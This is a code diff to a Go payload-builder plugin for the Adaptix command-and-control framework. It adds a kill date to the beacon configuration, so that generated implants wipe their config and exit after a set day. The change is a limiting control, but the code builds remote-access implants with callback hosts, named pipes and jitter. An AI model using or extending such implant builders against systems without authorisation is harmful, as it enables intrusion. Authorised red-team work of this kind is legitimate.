@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"time"
 
 	adaptix "github.com/Adaptix-Framework/axc2"
 )
@@ -93,6 +94,18 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	var sleepMs uint32
 	var jitterPct uint32
 
+	// W2.2 kill date: "YYYY-MM-DD" -> unix UTC seconds at 23:59:59 that day.
+	// Empty/absent = never expires. The beacon zeroes its config span and
+	// exits the process at loop head after this instant.
+	var killDate uint32
+	if v, ok := agentCfg["kill_date"].(string); ok && v != "" {
+		day, err := time.Parse("2006-01-02", v)
+		if err != nil {
+			return nil, "", fmt.Errorf("nonameax: kill_date %q not YYYY-MM-DD: %w", v, err)
+		}
+		killDate = uint32(day.AddDate(0, 0, 1).Unix() - 1)
+	}
+
 	var gateAPIs []string
 	if raw, ok := agentCfg["gate_apis"].([]any); ok {
 		for _, item := range raw {
@@ -107,7 +120,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		if pipeName == "" {
 			pipeName = "naxsmb"
 		}
-		configH = generateSmbConfigH(pipeName, key, 0, 0, watermark, listenerWatermark, gateAPIs)
+		configH = generateSmbConfigH(pipeName, key, 0, 0, killDate, watermark, listenerWatermark, gateAPIs)
 		transportProfile = 1
 	} else {
 		sleepSec := 10
@@ -157,7 +170,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				callbackPort = 80
 			}
 		}
-		configH = generateConfigH(callbackHost, callbackPort, bootURI, key, sleepMs, jitterPct, profileBytes, watermark, listenerWatermark, gateAPIs, listenerSSL)
+		configH = generateConfigH(callbackHost, callbackPort, bootURI, key, sleepMs, jitterPct, killDate, profileBytes, watermark, listenerWatermark, gateAPIs, listenerSSL)
 		transportProfile = 0
 	}
 
